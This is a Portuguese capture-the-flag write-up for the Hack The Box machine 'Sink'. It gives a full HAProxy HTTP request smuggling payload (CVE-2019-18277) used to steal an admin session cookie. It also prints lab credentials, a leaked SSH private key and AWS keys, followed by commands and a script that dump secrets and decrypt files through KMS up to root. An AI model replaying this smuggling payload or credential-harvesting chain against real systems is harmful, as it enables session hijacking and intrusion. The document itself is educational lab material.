---
title: HTB Sink Writeup
author: Hastur
date: 2021-09-16 21:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Request Smuggling, Gitea, AWS, Linux, Insane, Web]
image: "/img/htb/htb-sink-logo.png"
alt: "HTB Sink Writeup"
---

<img src="/img/htb/htb-sink-logo.png">

<br>


| Nome | Sink       |
|------|-------------|
|IP    | 10.10.10.225|
|Pontos| 50          |
|OS    | Linux       |
|Nível | Insane        |

<br>

Esta máquina rendeu algumas horas de pesquisa e muita leitura de arquivos, necessitou de bastante paciência e procura de informações.

Vamos ao tralho!

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Sink]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.225 --min-rate=512 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=9d90f44fb52ce3fa; Path=/; HttpOnly
|     Set-Cookie: _csrf=BfHNd7vcofRu_lA4Ie4IgUXAMHo6MTYzMTgzMzYzNDM1NTUxNTEwOQ; Path=/; Expires=Fri, 17 Sep 2021 23:07:14 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 16 Sep 2021 23:07:14 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=65211b52dbf6b99c; Path=/; HttpOnly
|     Set-Cookie: _csrf=vMhSEXnXeTofNKyqQFGBD9B8UY46MTYzMTgzMzY0MDM5NzUxNTM4Nw; Path=/; Expires=Fri, 17 Sep 2021 23:07:20 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 16 Sep 2021 23:07:20 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
| http-methods: 
|_  Supported Methods: OPTIONS POST GET HEAD
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops

```
O scan com nmap nos trouxe algumas informações interessantes, temos a porta 22-SSH, 3000-HTTP com o título `Gitea` e 5000-HTTP com o título `Sink Devops` e server-header `gunicorn/20.0.0`.

Vamos começar pela porta 5000.

### Porta 5000

<img src="/img/htb/htb-sink-1.png">

Encontramos a tela de login da `Sink Devops`, ainda não temos credenciais, mas existe um link para cadastro, vamos registrar um usuário e tentar login.

<img src="/img/htb/htb-sink-2.png">

Conseguimos logar com sucesso!

<img src="/img/htb/htb-sink-3.png">

Após um bom tempo de enumeração, decidi interceptar uma requisição com o `BURP` e encontrei algo interessante:

> Via: haproxy

<img src="/img/htb/htb-sink-4.png">

Depois de um bom tempo pesquisando, encontrei o `CVE-2019-18277` que fala sobre uma vulnerabilidade de `request smuggling`. O artigo em questão pode ser lido [aqui](https://nathandavison.com/blog/haproxy-http-request-smuggling).

Após estudar o artigo, descobri que podemos alterar uma requisição para obter um `CSRF`, vamos à exploração.

<img src="/img/htb/htb-sink-5.png">

Primeiro eu interceptei com o BURP uma requisição para inserir um comentário e enviei para o `Repeater`.

<img src="/img/htb/htb-sink-6.png">

Agora altere a requisição para o formato abaixo e com os mesmos `_csrf` e `Cookie` mas não mude o seu `session cookie`.

```
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 357
Origin: http://10.10.10.225:5000
DNT: 1
Connection: keep-alive
Referer: http://10.10.10.225:5000/home
Cookie: lang=zh-CN; i_like_gitea=1e8c376ed33ccd6e; _csrf=bsRZO43k9rTxqa5xKtfSmm747Y86MTYxMjc2MjIxNjA0MTE3MDI2MA; session=eyJlbWFpbCI6Img0MXN0dXJAaDQxc3R1ci5jb20ifQ.YUPQMg.1gIaOZDmrFyg_sGLg3TlV-LTkz8
Upgrade-Insecure-Requests: 1
Transfer-Encoding: Cwo=chunked

5
msg=h
0

POST /comment HTTP/1.1
Host: localhost:5000
Cookie: lang=zh-CN; i_like_gitea=1e8c376ed33ccd6e; _csrf=bsRZO43k9rTxqa5xKtfSmm747Y86MTYxMjc2MjIxNjA0MTE3MDI2MA; session=eyJlbWFpbCI6Img0MXN0dXJAaDQxc3R1ci5jb20ifQ.YUPQMg.1gIaOZDmrFyg_sGLg3TlV-LTkz8
Content-Length: 300
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

msg=
```

É importante que habilitemos a opção `Show non-printable chars` no BURP.

<img src="/img/htb/htb-sink-7.png">

Vários caracteres não printáveis foram mostrados, além deles, podemos ver os caracteres `Cwo=` em `Transfer-Encoding`, estes caracteres estão em base64, para descriptá-lo, precisamos selecioná-lo e pressionar `Ctrl+Shift+b` e a requisição ficará como abaixo:

<img src="/img/htb/htb-sink-8.png">

Agora enviamos a requisição.

<img src="/img/htb/htb-sink-9.png">

Agora podemos recarregar a página e capturar o cookie do `admin`.

<img src="/img/htb/htb-sink-10.png">

```
GET /notes/delete/1234 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: */* Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YUPKYw.hFHfoAVd5-WSHIRdJcpJD5qIQJ4 X-Forwarded-For: 127.0.0.1 
```

Agora podemos alterar nosso cookie nas opções de desenvolvedor do browser, no caso do Firefox, pressionando `F12`.

<img src="/img/htb/htb-sink-11.png">

Ao recarregar a página, estamos acessando como admin!!!

<img src="/img/htb/htb-sink-12.png">

Ao navegarmos até `Notes`, vemos três notas escritas, vamos checar seu conteúdo.

`Note (1)`

<img src="/img/htb/htb-sink-13.png">

```
Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz 
```


`Note (2)`

<img src="/img/htb/htb-sink-14.png">

```
Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3 
```

`Note (3)`

<img src="/img/htb/htb-sink-15.png">

```
Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\{*L.fB3C 
```

Conseguimos três credenciais!!!

Porém, nenhuma delas funcionou com acesso ssh, nos resta tentar a próxima porta do alvo.

## Porta 3000

<img src="/img/htb/htb-sink-16.png">

Temos a tela inicial do [Gitea](https://gitea.io/en-us/), vamos tentar acesso com as credenciais das notas, como primeira tentativa, vamos utilizar a credencial `root:FaH@3L>Z3})zzfQ3`.

<img src="/img/htb/htb-sink-17.png">

E conseguimos acesso!!!

Temos um `Git` com muitos commits. Aqui entra uma observação pessoal: Passei várias horas enumerando os commits até encontrar informações importantes para serem usadas.

Entre os commits, podemos encontrar uma chave `id_rsa_marcus` em  [http://10.10.10.225:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e](http://10.10.10.225:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e).

<img src="/img/htb/htb-sink-18.png">

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Vamos salvá-la e tentar um acesso ssh.

```bash
┌──(hastur㉿hastur)-[~/Sink]
└─$ vim id_rsa_marcus                                                                                                                                                                                                                    1 ⨯
                                                                                                                                                                                                                                             
┌──(hastur㉿hastur)-[~/Sink]
└─$ chmod 600 id_rsa_marcus 
                                                                                                                                                                                                                                             
┌──(hastur㉿hastur)-[~/Sink]
└─$ ssh marcus@10.10.10.225 -i id_rsa_marcus 
```

<img src="/img/htb/htb-sink-19.png">

E conseguimos nosso primeiro acesso ao server!!!

A flag `user.txt` está no diretório do usuário marcus.

```bash
marcus@sink:~$ ls -la
total 32
drwxr-xr-x 4 marcus marcus 4096 Jan 27  2021 .
drwxr-xr-x 5 root   root   4096 Dec  2  2020 ..
lrwxrwxrwx 1 marcus marcus    9 Dec  1  2020 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Dec  1  2020 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Dec  1  2020 .bashrc
drwx------ 2 marcus marcus 4096 Jan 27  2021 .cache
-rw-r--r-- 1 marcus marcus  807 Dec  1  2020 .profile
drwx------ 2 marcus marcus 4096 Dec  2  2020 .ssh
-r-------- 1 marcus marcus   33 Sep 16 22:50 user.txt
```

## Escalação de privilégios

Durante a enumeração na porta 3000, além da chave id_rsa_marcus, também encontrei o commit [http://10.10.10.225:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba](http://10.10.10.225:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba) que continha uma key e um secret para uma operação `aws`.

<img src="/img/htb/htb-sink-20.png">

```php
<?php
require 'vendor/autoload.php';

use Aws\CloudWatchLogs\CloudWatchLogsClient;
use Aws\Exception\AwsException;

$client = new CloudWatchLogsClient([
    'region' => 'eu',
    'endpoint' => 'http://127.0.0.1:4566',
    'credentials' => [
        'key' => 'AKIAIUEN3QWCPSTEITJQ',
        'secret' => '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'
    ],
    'version' => 'latest'
]);
try {
$client->createLogGroup(array(
    'logGroupName' => 'Chef_Events',
));
}
catch (AwsException $e) {
    echo $e->getMessage();
    echo "\n";
}
try {
$client->createLogStream([
    'logGroupName' => 'Chef_Events',
    'logStreamName' => '20201120'
]);
}catch (AwsException $e) {
    echo $e->getMessage();
    echo "\n";
}
?>
```
O que significa que podemos checar as configurações aws no server.

```bash
marcus@sink:~$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: us
Default output format [None]: json
```

<img src="/img/htb/htb-sink-21.png">

Depois disso, podemos listar os `secrets`.

```bash
marcus@sink:~$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
```

<img src="/img/htb/htb-sink-22.png">

Com as informações obtidas, podemos obter os valores dos secrets.

```bash
marcus@sink:~$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-HRbzR"
```

<img src="/img/htb/htb-sink-23.png">

E conseguimos a credencial do usuário david:david:EALB=bcC=`a7f2#k.

Vamos fazer o movimento lateral.

<img src="/img/htb/htb-sink-24.png">

Dentro do diretório do usuário david, encontrei o arquivo `servers.enc` no diretório `/home/david/Projects/Prod_Deployment`.

<img src="/img/htb/htb-sink-25.png">

Este arquivo está encriptado, pois é uma criptografia `server-side` da aws. Para conseguir abrí-lo, precisamos da key correta, novamente utilizaremos as configurações da aws.

```bash
david@sink:~/Projects/Prod_Deployment$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: us
Default output format [None]: json
```

Agora podemos listar as `keys`.

```bash
david@sink:~/Projects/Prod_Deployment$ aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
```

<img src="/img/htb/htb-sink-26.png">

Encontramos várias keys, para não tentarmos uma por uma, podemos fazer um script para testar uma de cada vez.

```bash
#!/bin/bash

for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '{ print $4 }')
        do 
                aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "${KEY}"
                aws --endpoint-url="http://127.0.0.1:4566/" kms decrypt --key-id "${KEY}" --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --output "text" --query "Plaintext"
done
```
Ao rodar o script, ele tentará decriptar o arquivo.

<img src="/img/htb/htb-sink-27.png">

Agora podemos utilizar o [CyberChief](https://gchq.github.io/CyberChef/) para decriptar este `base64`.

<img src="/img/htb/htb-sink-28.png">

Ao clicarmos em `servers.yml`, conseguimos as credenciais `admin:_uezduQ!EY5AHfe2`.

<img src="/img/htb/htb-sink-29.png">

Ao tentar ssh com estas credenciais não obtivemos resposta, porém, como o user é `admin`, vamos tentar ssh com `root`.

<img src="/img/htb/htb-sink-30.png">

E conseguimos acesso `root`!!!

A flag `root.txt` se encontra no diretório `/root`.


E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>
### Referências

| Vulnerabilidade                           | Url                                                                                                             |
|-------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| HAProxy HTTP request smuggling (CVE-2019-18277) | [https://nathandavison.com/blog/haproxy-http-request-smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)|
| CyberChef | [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)


